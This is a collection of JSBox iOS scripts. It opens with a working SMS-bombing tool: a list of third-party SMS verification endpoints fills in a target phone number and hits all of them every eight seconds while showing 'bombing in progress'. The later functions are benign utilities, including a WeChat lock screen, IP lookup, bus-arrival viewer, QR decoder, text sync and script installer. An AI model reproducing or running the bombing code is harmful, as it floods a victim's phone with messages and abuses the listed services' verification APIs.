        "url": "http:\/\/k.pigcms.com.cn\/cashier\/merchants.php?m=Index&c=login&a=getCode",
        "parm": "phone=手机号码&type=register&aid=1",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yun8848.com:8848\/Ajax\/Register\/RegisterApply.aspx?Action=GetCode&time=1552722033645",
        "parm": "reg_tel=手机号码&can_repeat=&repeat_type=2",
        "type": "POST"
    }, {
        "url": "https:\/\/admin.huawin.top\/api\/captcha?mobile=手机号码&type=0",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/www.ycyun.vip\/merchant\/verification",
        "parm": "telephone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.easyder.com\/Home\/publicity\/ajaxSendSms.html",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.keruyun.vip\/ajax\/smessreg.php",
        "parm": "mobile=手机号码&code=",
        "type": "POST"
    }, {
        "url": "https:\/\/epassport.meituan.com\/api\/biz\/auth\/sms?service=erp&bg_source=7&part_type=1",
        "parm": "{\"partKey\":\"\",\"login\":\"\",\"password\":\"\",\"confirmPassword\":\"\",\"mobile\":\"手机号码\",\"sms_code\":\"\",\"intercode\":\"86\",\"isFetching\":false,\"success\":\"\",\"error\":\"\",\"captcha_v_token\":\"\",\"verifyEvent\":5}",
        "type": "POST"
    }, {
        "url": "https:\/\/api.shandianyu.com\/v2\/member\/user\/getcode",
        "parm": "version=3.5.1&from=h5&phone=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.battlenet.com.cn\/account\/creation\/sms-verification\/send-code",
        "parm": "csrftoken=f7219fef-6ba9-47d2-ae1b-a174d131b376&mobileNumber=手机号码&countryCode=86",
        "type": "POST"
    }, {
        "url": "https:\/\/www.jiheyun.com\/process.aspx?c=sendvcode&vt=sms&va=reg&mobile=手机号码&Sat%20Mar%2016%202019%2017:09:22%20GMT+0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/www.a5.net\/plugin.php?id=bischina_captcha:msmscode&mobile=手机号码&infloat=yes&handlekey=mcode&inajax=1&ajaxtarget=fwin_content_mcode",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/my.17ce.com\/code",
        "parm": "mobile=手机号码&_csrf=GXaSdpcC7-Pxc5FTZS7_JHkIsAhh2IX_h0odJ7SZM-lpW-pA_DCNsrkU_jkdSY9iCF32QFn10q31Il9xgs0Dng%3D%3D",
        "type": "POST"
    }, {
        "url": "http:\/\/www.xingzuoyunshi.cn\/member\/index_do.php?fmdo=user&dopost=sendCode",
        "parm": "username=手机号码&type=register",
        "type": "POST"
    }, {
        "url": "http:\/\/user.guitarworld.com.cn\/reg_send_code",
        "parm": "mobile=手机号码",
        "type": "POST"
    }, {
        "url": "https:\/\/www.jitashe.org\/api\/mobile\/iyz_index.php?version=4&android=1&iyzversion=4&module=sms_sendcode&recnum=手机号码&iyzmobile=1",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/termib.juzifenqi.com\/termi\/sendVerifySMSIsCheckNew.do?mobile=手机号码&flag=1&verifyCode=&verifyKey=867251035115402&apiToken=21c48ad9b2f2a8e9b384fd0980378351&time=20190210194159",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/i.flyme.cn\/uc\/system\/vcode\/sendSmsVCodeAndGetPhoneAndmatchRex?phone=手机号码&vCodeTypeValue=10",
        "parm": "",
        "type": "GET"
    }, {
        "url": "https:\/\/e.passiontec.cn\/crm-api\/hq-sms\/sms\/send\/free\/security\/verify_code",
        "parm": "mobile=手机号码&redisKey=agency%3Areg%3Averifycode%3A",
        "type": "POST"
    }, {
        "url": "https:\/\/km.m10027.com\/xums\/w\/user\/getSmsCode",
        "parm": "{\"phone\":\"手机号码\",\"inviteCode\":\"sup41i\"}",
        "type": "POST"
    }, {
        "url": "http:\/\/www.yuzhi.me\/手机号码",
        "parm": "",
        "type": "GET"
    }];

    function oJiekou1(phone) {
        return jiekou.map((item) => {
            let itm = JSON.stringify(item);
            return JSON.parse(itm.replace(/手机号码/g, phone));
        })
    };
    // http://jk.014ka.com/jk1.php?jhm=1o585141FAZj37P5f2&key=888BED77-128C-4984-86E6-F274540BF908
    var off = false;
    var timer = null;
    var oJiekou = [];

    function start(oJiekou) {
        $ui.loading("轰炸中...");
        var i = 0;
        oJiekou.map((item, index) => {
            let sparm = item.parm;
            let parmBody = {};
            if (sparm != "") {
                sparm.split('&').map((e, item) => {
                    let a = e.split('=');
                    parmBody[a[0]] = a[1]
                })
                // console.log(parmBody)
            }
            $http.request({
                method: item.type,
                url: item.url,
                header: {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0"
                },
                body: parmBody,
                handler: function (resp) {
                    // var data = resp.data
                    // console.log(index,data)
                }
            })
        })
    }

    $ui.push({
        views: [{
                type: "input",
                name: "inputI",
                props: {
                    type: $kbType.search,
                    placeholder: "请输入手机号",
                    darkKeyboard: true,
                },
                layout: function (make, view) {

                    make.left.right.top.inset(10)
                    make.size.equalTo($size(100, 50))
                },
                events: {
                    changed: function (sender) {
                        // console.log(sender.text)
                        // console.log(oJiekou1(sender.text))
                        oJiekou = oJiekou1(sender.text);
                    }
                }
            },
            {
                type: "button",
                props: {
                    title: "开始"
                },
                layout: function (make, view) {
                    make.left.right.inset(10)
                    make.top.inset(90)
                    make.size.equalTo($size(100, 50))
                },
                events: {
                    tapped: function (sender) {
                        off = true;
                        $ui.get("spinner").loading = true
                        // console.log(oJiekou)
                        timer = setInterval(() => {
                            start(oJiekou)
                        }, 8000);
                    }
                }
            },
            {
                type: "button",
                props: {
                    title: "停止"
                },
                layout: function (make, view) {
                    make.left.right.inset(10)
                    make.top.inset(150)
                    make.size.equalTo($size(100, 50))
                },
                events: {
                    tapped: function (sender) {
                        off = false;
                        $ui.get("spinner").loading = false;
                        clearInterval(timer)
                    }
                }
            },
            {
                type: "spinner",
                props: {
                    loading: false
                },
                layout: function (make, view) {
                    make.center.equalTo(view.super)
                }
            }

        ]
    })


}


function yijm() {
    $system.volume = 0
}


function wwxb() {
    FILE = "password.js"


    if ($file.exists(FILE)) {
        let pass = $file.read(FILE).string
        $ui.push({
            props: {
                title: "微信已被锁定",
                bgcolor: $color("#157efb")
            },
            views: [{
                type: "view",
                props: {
                    id: ""
                },
                layout: $layout.fill,
                views: [{
                    type: "image",
                    props: {
                        id: "lock_icon",
                        src: "https://github.com/Fndroid/jsbox_script/blob/master/imgs/wechatlog_icon.jpg?raw=true"
                    },
                    layout: (make, view) => {
                        make.centerX.equalTo(view.super)
                        make.top.equalTo(40)
                    }
                }],
                events: {}
            }, {
                type: "input",
                props: {
                    id: "pass_input",
                    align: $align.center,
                    secure: true,
                    placeholder: "微信密码",
                    type: $kbType.number,
                },
                layout: (make, view) => {
                    make.centerX.equalTo(view.super),
                        make.top.equalTo($("lock_icon").bottom).inset(10)
                    make.size.equalTo($size(150, 40))
                },
                events: {
                    changed: sender => {
                        if ($text.MD5($("pass_input").text) == pass) {
                            $("pass_input").text = ""
                            $app.openURL("wechat://")
                            $app.close()
                        }
                    },
                    didEndEditing: sender => {
                        $app.close()
                        $objc("UIApplication").invoke("sharedApplication.suspend")
                    }
                }
            }]
        })
    } else {
        $input.text({
            type: $kbType.number,
            placeholder: "首次进入,请设置密码",
            handler: function (text) {
                $file.write({
                    data: $data({
                        "string": $text.MD5(text)
                    }),
                    path: FILE
                })
            }
        })

    }

    $("pass_input").focus()

}

function ipia() {
    $http.get({
        url: "http://clientapi.ipip.net/ip.php?a=location",
        handler: function (resp) {
            var ip = resp.data.ip
            var remote_addr = resp.data.remote_addr
            var loc = resp.data.loc
            $http.get({
                url: "http://myip.hk/",
                handler: function (resp) {
                    var regex = /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/
                    var proxy = regex.exec(resp.data)[1]
                    $http.get({
                        url: "http://freeapi.ipip.net/" + proxy,
                        handler: function (resp) {
                            var message = ""
                            message += "代理 IP: " + proxy + "\n"
                            message += "位置: " + resp.data.join("") + "\n"
                            message += "国内 IP: " + ip + "\n"
                            message += "位置: " + loc
                            $ui.alert(message)
                        }
                    })
                }
            })
        }
    })


}

function ield() {
    /**erots
    id: 5cf095b5ba39c80068b16cc6
    build: 1
    */
    const version = 1.2; //版本号
    var getCityCodeUrl;
    var getNearStsUrl;
    var getstationDetailUrl;
    var getLineDetailUrl;
    var lat;
    var lng;
    var datalist = []
    var direction = $cache.get("direction") || 0;
    var cityId = "";
    var cityName = "";

    //更新当前地理位置
    function updateLoc() {
        //获得当前地理位置,设置url
        $location.fetch({
            handler: function (resp) {
                lat = resp.lat.toFixed(6);
                lng = resp.lng.toFixed(6);
                getCityCodeUrl = "https://api.chelaile.net.cn/goocity/city!localCity.action?s=IOS&gpsAccuracy=65.000000&gpstype=wgs&push_open=1&vc=10554&lat=" + lat + "&lng=" + lng;
                $http.get({
                    url: getCityCodeUrl,
                    handler: function (resp) {
                        console.log(resp)
                        if (resp.response != null) {
                            var data = JSON.parse(resp.data.replace("**YGKJ", "").replace("YGKJ##", ""));
                            cityId = data.jsonr.data.localCity.cityId;
                            cityName = data.jsonr.data.localCity.cityName;
                            if (cityId == -1) {
                                $ui.toast("暂不支持当前城市...")
                            } else {
                                getNearStsUrl = "https://api.chelaile.net.cn/bus/stop!homePageInfo.action?type=1&act=2&gpstype=wgs&gpsAccuracy=65.000000&cityId=" + cityId + "&hist=&s=IOS&sign=&dpi=3&push_open=1&v=5.50.4&lat=" + lat + "&lng=" + lng;
                                refreshNearSts();
                            }
                        } else {
                            $ui.toast("请求失败...")
                        }

                        //$console.info(cityName+":"+cityId);

                    }
                })
            }
        })
    }

    $ui.push({
        type: "view",
        props: {
            navBarHidden: false,
        },
        views: [{
            type: "view",
            props: {
                id: "toolBar",
                bgcolor: $color("#f3f4f4")
            },
            views: [{
                type: "label",
                props: {
                    id: 'pageTitle', //标题
                    text: '附近站点',
                    font: $font("bold", 18),
                    textColor: $color('black'),
                    align: $align.center
                },
                layout: function (make, view) {
                    make.left.right.equalTo(0);
                    make.top.equalTo(10);
                    make.height.equalTo(20);
                },
            }],
            layout: function (make, view) {
                make.left.right.equalTo(0);
                make.height.equalTo(40);
            },
        }, {
            type: "matrix",
            props: {
                id: "nearStsList",
                columns: 1,
                itemHeight: 90, //每行高度
                square: false,
                spacing: 10, //间隔
                bgcolor: $color("#f3f4f4"),
                template: {
                    type: "view",
                    props: {
                        bgcolor: $color("#FFFFFF"),
                        textColor: $color("black"),
                        radius: 10,
                    },
                    views: [{
                        type: "label",
                        props: {
                            id: "nearSts_sn", //附近站点名
                            font: $font("bold", 20),
                            autoFontSize: true
                        },
                        layout: function (make, view) {
                            make.top.left.equalTo(15);
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "nearSts_lineNames", //公交线路名
                            font: $font("bold", 15),
                            autoFontSize: false
                        },
                        layout: function (make, view) {
                            var preView = $("nearSts_sn")
                            make.top.equalTo(preView.bottom).inset(13)
                            make.left.equalTo(preView.left)
                            make.right.inset(5)
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "nearSts_distance",
                            font: $font(13),
                            bgcolor: $color("#F5F5F5"),
                            textColor: $color("#666666"),
                            radius: 2
                        },
                        layout: function (make, view) {
                            var preView = $("nearSts_sn")
                            make.centerY.equalTo(preView.centerY)
                            make.right.equalTo(0).inset(20)
                        }
                    }]
                }
            },
            events: {
                pulled: function (sender) {
                    updateLoc();
                },
                didSelect: function (sender, indexPath, data) {
                    $ui.loading(true);
                    $ui.toast("加载中...", 1)
                    var stsName = data.nearSts_sn.text;
                    var id = data.id.text;
                    getstationDetailUrl = "https://api.chelaile.net.cn/bus/stop!stationDetail.action?&destSId=-1&gpsAccuracy=65.000000&lorder=1&stats_act=refresh&stationId=" + id + "&cityId=" + cityId + "&sign=&stats_referer=nearby&s=IOS&dpi=3&push_open=1&v=5.50.4";
                    $http.get({
                        url: encodeURI(getstationDetailUrl),
                        handler: function (resp) {
                            $ui.loading(false);
                            var data = resp.data
                            getStsDetail(data)
                        }
                    })
                }
            },
            layout: function (make, view) {
                make.top.equalTo(30);
                make.left.right.equalTo(0);
                make.bottom.equalTo(0);
            }
        }]
    })

    function makeStsData(jsondata) {
        var lines = jsondata.jsonr.data.lines.filter(function (line) {
            return line.line.direction == direction
        }); //正方向
        var stsname = jsondata.jsonr.data.sn;
        var sdata = [];
        for (let i = 0; i < lines.length; i++) {
            var stnStates = lines[i].stnStates; //下一班车集合
            var arrivalTime = "";
            var otherTime = "下一班时间";

            if (stnStates.length > 0) {
                arrivalTime = getArrivalTime(stnStates[0].arrivalTime);
            } else {
                arrivalTime = lines[i].line.desc;
            }
            $console.info(arrivalTime + "分钟")
            var obj = {
                lineName: {
                    text: lines[i].line.name + "路"
                },
                lineId: {
                    text: lines[i].line.lineId
                },
                wokingtime: {
                    text: "首 " + lines[i].line.firstTime + " 末 " + lines[i].line.lastTime
                },
                nextStName: {
                    text: "> 下一站·" + lines[i].nextStation.sn
                },
                nextStid: {
                    text: lines[i].nextStation.sId
                },
                ariTime: {
                    text: arrivalTime + ""
                },
                otTime: {
                    text: otherTime
                },
                endSn: {
                    text: lines[i].line.endSn
                },
                targetOrder: {
                    text: lines[i].targetStation.order //当前站点的order
                }
            }
            sdata.push(obj);
        }
        return sdata;
    }

    async function getStsData() {
        $ui.loading(true);
        var resp = await $http.get(getstationDetailUrl)
        var data = JSON.parse(resp.data.replace("**YGKJ", "").replace("YGKJ##", ""));
        $("stnDetailList").data = makeStsData(data);
        $("stnDetailList").endFetchingMore();
        $("stnDetailList").endRefreshing();
        $ui.loading(false);
    }


    //刷新附近站点
    function refreshNearSts() {
        $ui.loading(true)
        $http.get({
            url: encodeURI(getNearStsUrl),
            handler: function (resp) {
                $ui.loading(false)
                $("nearStsList").endFetchingMore()
                var data = JSON.parse(resp.data.replace("**YGKJ", "").replace("YGKJ##", ""));
                var datalist = [];
                //$console.info(data);
                //$console.info(resp.data.replace("**YGKJ","").replace("YGKJ##",""));
                var nearSts = data.jsonr.data.nearSts;
                //$console.info(nearSts);
                for (let i = 0; i < nearSts.length; i++) {
                    var obj = {
                        nearSts_sn: {
                            text: nearSts[i].sn
                        },
                        nearSts_lineNames: {
                            text: nearSts[i].lineNames
                        },
                        nearSts_distance: {
                            text: nearSts[i].distance < 100 ? "<100m" : nearSts[i].distance + "m"
                        },
                        id: {
                            text: nearSts[i].sId
                        },
                        sortPolicy: {
                            text: nearSts[i].sortPolicy
                        }
                    }
                    datalist.push(obj);
                }
                $("nearStsList").endRefreshing();
                $("nearStsList").data = datalist;
            }
        })
    }

    //获得站点明细
    function getStsDetail(stsdata) {
        var data = JSON.parse(stsdata.replace("**YGKJ", "").replace("YGKJ##", ""));
        renderStationDetail(makeStsData(data), data.jsonr.data.sn);
    }
    //渲染站点明细列表
    function renderStationDetail(sdata, sname) {
        $ui.push({
            props: {
                title: sname,
                id: "stnDeatilView"
            },
            views: [{
                type: "list",
                props: {
                    id: "stnDetailList",
                    rowHeight: 80,
                    data: sdata,
                    bgcolor: $color("#f3f4f4"),
                    template: [{
                        type: "label",
                        props: {
                            id: "lineName",
                            font: $font("bold", 17),
                            autoFontSize: true
                        },
                        layout: function (make, view) {
                            make.top.left.inset(15)
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "nextStName",
                            font: $font(13),
                            textColor: $color("darkGray"),
                            autoFontSize: false
                        },
                        layout: function (make, view) {
                            var preView = $("lineName");
                            make.top.equalTo(preView.bottom).inset(10);
                            make.left.equalTo(preView.left)
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "wokingtime",
                            font: $font(10),
                            textColor: $color("lightGray"),
                            autoFontSize: false
                        },
                        layout: function (make, view) {
                            var preView = $("nextStName");
                            //make.top.equalTo(preView.bottom).inset(10);
                            make.left.equalTo(preView.left)
                            make.top.equalTo(preView.bottom).inset(2)
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "ariTime",
                            font: $font(15),
                        },
                        layout: function (make, view) {
                            var preView = $("lineName");
                            //make.left.equalTo(preView.right);
                            make.right.inset(25)
                            make.centerY.equalTo(preView.centerY);
                        }
                    }, {
                        type: "label",
                        props: {
                            id: "otTime",
                            font: $font(13),
                            textColor: $color("darkGray"),
                        },
                        layout: function (make, view) {
                            var preView = $("ariTime");
                            //make.left.equalTo(preView.right);
                            make.right.equalTo(preView.right);
                            make.centerY.equalTo($("nextStName").centerY);
                        }
                    }],
                    //list的头，放置搜索框和tab按钮
                    header: {
                        type: "view",
                        props: {
                            height: 50,
                            //bgcolor: $color("white")
                        },
                        views: [{
                            type: "tab",
                            props: {
                                id: "direcTab",
                                index: direction,
                                items: ["正方向", "反方向"],
                                tintColor: $color("#666666")
                            },
                            layout: function (make, view) {
                                make.center.equalTo(view.center);
                            },
                            events: {
                                changed: function (sender) {
                                    $("stnDetailList").endFetchingMore()
                                    var direc = sender.index; //方向
                                    direction = direc;
                                    $cache.set("direction", direc);
                                    getStsData();
                                }
                            }
                        }]
                    },
                },
                layout: $layout.fill,
                events: {
                    pulled: function (sender) {
                        getStsData();
                    },
                    didSelect: function (sender, indexPath, data) {
                        var url = encodeURI("https://api.chelaile.net.cn/bus/line!lineDetail.action?mac=&userId=&vc=10555&cityState=0&gpsAccuracy=65.000000&stats_order=1-2&sign=&s=IOS&stats_referer=stationDetail&v=5.50.5&lineId=" + data.lineId.text + "&cityId=" + cityId + "&targetOrder=" + data.targetOrder.text);
                        $ui.loading(true)
                        $http.get({
                            url: url,
                            handler: function (resp) {
                                var data = getJson(resp.data);
                                var msg = "暂无信息！";
                                if (data.jsonr.data.buses.length > 0) {
                                    var nextorder = data.jsonr.data.buses[0].order
                                    var nextStation = data.jsonr.data.stations.filter(function (st) {
                                        return st.order == nextorder
                                    })[0]
                                    $console.info(nextStation);
                                    msg = "下一班车即将到达：" + nextStation.sn;
                                }
                                $ui.loading(false)
                                $ui.alert({
                                    title: "线路信息",
                                    message: msg,
                                    actions: [{
                                        title: "取消",
                                        handler: function () {

                                        }
                                    }]
                                })
                            }
                        })
                    }
                }
            }]
        })
    }

    function getArrivalTime(unixtime) {
        var ariDate = new Date(unixtime);
        var ariHours = ariDate.getHours();
        var ariMinute = ariDate.getMinutes();
        var now = new Date().getTime();
        var minute = 1000 * 60;
        var diffminute = Math.round((unixtime - now) / minute);

        if (diffminute < 0) {
            return "已到达";
        } else if (diffminute >= 60) {
            return (ariHours < 10 ? '0' + ariHours : ariHours) + ":" + (ariMinute < 10 ? '0' + ariMinute : ariMinute)
        } else {
            return diffminute + "分";
        }

    }

    function getJson(data) {
        //$console.info(data)
        return JSON.parse(data.replace("**YGKJ", "").replace("YGKJ##", ""));
    }
    (async function checkUpdate() {
        const versionURL = 'https://raw.githubusercontent.com/MapleRen/JSBox/master/chelaile/versioninfo.json'
        let resp = await $http.get(versionURL)
        const jsURL = 'https://raw.githubusercontent.com/MapleRen/JSBox/master/chelaile/chelaile.js&icon=icon_087.png&types=1&version=' + resp.data.version + '&name=车来了&author=Ren'
        const updateURL = `jsbox://install?url=${encodeURI(jsURL)}`
        console.log(resp)
        if (version >= resp.data.version || resp.response == null) return
        $ui.action({
            title: '更新提示',
            message: '发现新版本' + resp.data.version + ', \n(是否更新 ?更新完请重新启动新版本。)\n' + resp.data.msg,
            actions: [{
                    title: '更新',
                    handler: () => {
                        $app.openURL(updateURL)
                        $ui.toast('正在安装更新...')
                        $app.close();
                    }
                },
                {
                    title: '取消'
                }
            ]
        })
    })()

    updateLoc();

}


function erjp() {
    /**erots
    id: 5ced36e043e78c0067271556
    build: 1
    */


    $ui.menu({
        items: ["扫描二维码", "选取相册"],
        handler: function (title, idx) {
            if (idx == 0) {
                $qrcode.scan(function (text) {
                    show(text)
                })
            } else {
                $photo.pick({
                    handler: function (resp) {
                        var image = resp.image
                        var text = $qrcode.decode(image)
                        show(text)
                    }
                })
            }
        }
    })

    function show(text) {
        $ui.render({
            props: {
                id: "label",
                title: "二维码解析"
            },
            views: [{
                type: "text",
                props: {
                    text: text,
                },
                layout: $layout.fill
            }]
        })
    }

}




function whye() {
    /**erots
    id: 5cfdca82ba39c800683bf824
    build: 2
    */
    /* 
     * https://github.com/lic2870/JSBox
     * @version 1.0
     * @date 2018.8.2
     * @note
     * 1. 在脚本“文本收藏夹”的基础上，将文本保存到 iCloud Drive 的 txt 文件中，方便在 PC 端查看
     * 2. 感谢@cyan和@Se7en，这个脚本在你们的脚本基础上完善
     */

    $app.strings = {
        "en": {
            "MAIN_TITLE": "Web Love",
            "PLACEHOLDER": "Please input text here",
            "COPIED": "Copied",
            "ERROR": "Error",
            "CANCEL": "Cancel"
        },
        "zh-Hans": {
            "MAIN_TITLE": "网页收藏器",
            "PLACEHOLDER": "输入要同步的文字",
            "COPIED": "已复制",
            "ERROR": "哦豁，出错了",
            "CANCEL": "取消"
        }
    }

    function dated() {
        var text = $clipboard.text


        $ui.push({


            views: [{
                type: "web",
                props: {


                    url: text,
                    toolbar: true,
                    bgcolor: $color("#1D1D27"),


                },
                layout: $layout.fill
            }]


        })
        $clipboard.text = ""

    }

    var txt = $drive.read("TextSync.txt")

    if (txt === undefined) {
        var success = $drive.write({
            data: $data({
                string: "文本同步至 iCloud Drive\r\n点击复制，左划删除"
            }),
            path: "TextSync.txt"
        })
        txt = $drive.read("TextSync.txt")
        if (txt === undefined) {
            $ui.toast($l10n("ERROR"))
            return
        }
    }

    var clips = $text.decodeData({
        data: txt,
        encoding: 4
    })
    clips = clips.split("\r\n")

    $ui.push({
        props: {
            title: $l10n("MAIN_TITLE")
        },
        views: [{
                type: "input",
                props: {
                    placeholder: $l10n("PLACEHOLDER")
                },
                layout: function (make) {
                    make.top.left.inset(10)
                    make.right.inset(10)
                    make.height.equalTo(32)
                },
                events: {
                    ready: function (sender) {
                        //sender.focus()
                        if ($clipboard.text == undefined) {

                        } else {
                            //sender.text = $clipboard.text
                        }
                    },
                    returned: function (sender) {
                        if (sender.text == "") {
                            sender.blur()
                            return
                        }
                        insertItem(sender.text)
                        sender.text = ""
                    }
                }
            },
            {
                type: "list",
                props: {
                    id: "list",
                    data: clips,
                    actions: [{
                        title: "delete",
                        handler: function (sender, indexPath) {
                            deleteItem(indexPath)
                        }
                    }]
                },
                layout: function (make) {
                    make.left.bottom.right.equalTo(0)
                    make.top.equalTo($("input").bottom).offset(10)
                },
                events: {
                    didSelect: function (sender, indexPath, title) {
                        $clipboard.text = title
                        $device.taptic()

                        dated()
                    }
                }
            }
        ]
    })

    var listView = $("list")
    listView.data = clips

    function insertItem(text) {
        clips.unshift(text)
        listView.insert({
            index: 0,
            value: text
        })
        saveItems()
    }

    function deleteItem(indexPath) {
        var text = clips[indexPath.row]
        var index = clips.indexOf(text)
        if (index >= 0) {
            clips.splice(index, 1)
            saveItems()
        }
    }

    function saveItems() {
        var success = $drive.write({
            data: $data({
                string: clips.join("\r\n")
            }),
            path: "TextSync.txt"
        })
    }

}

function aaa() {
    /*
    由于ios12系统权限问题导致url以及文件方式分享的脚本都不能通过 URL Schemes 以及 Action Extension 来进行安装了，虽然还可以用复制代码的方式来安装我们的脚本。但是复制代码这个方法比较麻烦。所以是很有必要写这么一个脚本，为了方便我自己的同时也方便大家。所以分享这个脚本给大家。
    jsbox脚本安装器使用也很简单，我们只需要复制脚本的分享链接，然后运行这个脚本安装器就可以安装了。非常方便快捷。
    
    by：iPhone 8、小良
    https://ae85.cn/
    */
    if ($app.info.bundleID == "app.cyan.pin") {
        $ui.alert("该脚本不支持Pin！\n只支持JSBox \n\npin请使用复制代码方式添加");
        $app.openURL("http://qq.cn.hn/g4s");
        return;
    }

    if ($app.env == $env.action) {
        var data = $context.data
        var name = data.fileName
        install(data, name)
        return;
    }

    var link = $clipboard.link
    if (link) {
        if (link.indexOf('jsbox://') !== -1) {
            urlcl(link)
        } else {
            $http.get({
                url: link,
                header: {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
                },
                handler: function (resp) {
                    var data = resp.data
                    var link = data.match(/jsbox:\/\/(\S*?)\'/)[1]
                    urlcl(link)
                }
            })
        }

    } else {
        $ui.alert({
            title: "温馨提示:",
            message: "\n请先复制脚本链接再运行！\n\n不会使用？看看教程吧！",
            actions: [{
                title: "查看图文教程",
                handler: function () {
                    $app.openURL("http://qq.cn.hn/g43");
                }
            }, {
                title: "观看视频教程",
                handler: function () {
                    $app.openURL("http://t.cn/E2gUpNI");
                }
            }, {
                title: "取消"
            }]

        });
    }

    function urlcl(link) {
        var shu = link.split("&")
        var url = $text.URLDecode(shu[0].split("url=")[1])
        if (url.indexOf('/blob/master/') !== -1) {
            url = url.replace(/\/blob\/master\//, "/raw/master/")
        }
        var name = $text.URLDecode(shu[1].split("name=")[1])
        $ui.toast("正在安装中 ...");
        $http.download({
            url: url,
            handler: function (resp) {
                install(resp.data, name)
            }
        })
    }

    function install(data, name) {
        $addin.save({
            name: name,
            data: data,
            handler: function () {
                $ui.alert({
                    title: "安装完成",
                    message: "\n是否打开？\n" + name,
                    actions: [{
                            title: "打开",
                            handler: function () {
                                $app.openExtension(name)
                                $app.close(delay)
                            }
                        },
                        {
                            title: "不了"
                        }
                    ]
                });
            }
        })
    }

}

function rrjm() {
    /*
    
     用了XY助手的api，又可以少装一个app啦
     在应用详情界面长按“安装”按钮可以复制IPA包的链接
     点击应用图标可查看大图,长按大图可保存
     注意:部分应用安装后会弹出提示输入账号密码,请在电脑上用XY助手PC版授权后使用
     
     by:Hhdº
    
     有问题请发邮件到 hehedahhd@icloud.com
    
    */

    const iconType = ["062", "102", "023"]

    const mainColor = $color("#0080FF")

    VIEW = {
        type: "view",
        props: {
            id: "Rview"
        },
        views: [{
                type: "view",
                props: {
                    id: "line",
                    bgcolor: $color("#b2b2b2")
                },
                layout: function (make) {
                    make.top.right.left.inset(0)
                    make.height.equalTo(0.5)
                }
            },
            {
                type: "button",
                props: {
                    id: "B1",
                    bgcolor: $color("white")
                },
                layout: function (make, view) {
                    make.bottom.inset(0)
                    make.top.equalTo($("line").bottom)
                    make.width.equalTo(view.super).dividedBy(3)
                },
                events: {
                    tapped(sender) {
                        ChangeColor(sender)
                        MainView()
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "B2",
                    bgcolor: $color("white")
                },
                layout: function (make, view) {
                    make.bottom.inset(0)
                    make.left.equalTo($("B1").right)
                    make.top.equalTo($("line").bottom)
                    make.width.equalTo(view.super).dividedBy(3)
                },
                events: {
                    tapped(sender) {
                        ChangeColor(sender)
                        SecondView()
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "B3",
                    bgcolor: $color("white")
                },
                layout: function (make, view) {
                    make.bottom.inset(0)
                    make.left.equalTo($("B2").right)
                    make.top.equalTo($("line").bottom)
                    make.width.equalTo(view.super).dividedBy(3)
                },
                events: {
                    tapped(sender) {
                        ChangeColor(sender)
                        ThirdView()
                    }
                }
            }
        ],
        layout: function (make) {
            make.left.right.bottom.inset(0)
            make.height.equalTo(44)
        }
    }

    function MainView() {
        $ui.push({
            props: {
                title: "精选"
            },
            views: [VIEW,
                {
                    type: "menu",
                    props: {
                        id: "StarMenu",
                        items: ["热门", "必备", "新游", "小说"]
                    },
                    layout: function (make) {
                        make.left.top.right.equalTo(0)
                        make.height.equalTo(44)
                    },
                    events: {
                        changed: function (sender) {
                            if (sender.index == 0) {
                                RM(1)
                            } else if (sender.index == 1) {
                                BB()
                            } else if (sender.index == 2) {
                                XY(1)
                            } else {
                                $ui.push({
                                    props: {
                                        title: "小说"
                                    },
                                    views: [{
                                        type: "web",
                                        props: {
                                            url: "http://ikan.qq.com/kingnet/index.html?g_f=100032&certId=763&isauthor=2&flagdata=0&spflag=0&ipatype=1&sign=97a569bd2f1577bcca18620566ab9952"
                                        },
                                        layout: $layout.fill
                                    }]
                                })
                            }
                            $cache.set("page", 1)
                        }
                    }
                },
                {
                    type: "list",
                    props: {
                        id: "StarList",
                        rowHeight: 85,
                        template: [{
                                type: "image",
                                props: {
                                    id: "img",
                                    radius: 15
                                },
                                layout: function (make, view) {
                                    make.left.top.bottom.inset(5)
                                    make.width.equalTo(view.height)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "title",
                                    font: $font("bold", 17)
                                },
                                layout: function (make) {
                                    make.left.equalTo($("img").right).offset(10)
                                    make.top.right.inset(12)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "AppInfo",
                                    font: $font("bold", 12),
                                    textColor: $color("gray")
                                },
                                layout: function (make) {
                                    make.left.equalTo($("title"))
                                    make.top.inset(37)
                                    make.right.inset(10)
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "dis",
                                    font: $font("bold", 13)
                                },
                                layout: function (make) {
                                    make.left.equalTo($("title"))
                                    make.top.inset(58)
                                    make.right.inset(10)
                                }
                            },
                        ]
                    },
                    layout: function (make) {
                        make.top.equalTo($("StarMenu").bottom)
                        make.right.left.inset(0)
                        make.bottom.equalTo($("Rview").top)
                    },
                    events: {
                        didReachBottom: function (sender) {
                            sender.endFetchingMore()
                            if ($("StarMenu").index == 2) {
                                var page = $cache.get("page") + 1
                                $cache.set("page", page)
                                XY(page)
                            }
                        },
                        didSelect: function (sender, indexPath, data) {
                            $http.get({
                                url: "http://mobile.xyzs.com/app/index?itunesid=" + data.id,
                                handler(resp) {
                                    details(resp.data.data.app)
                                }
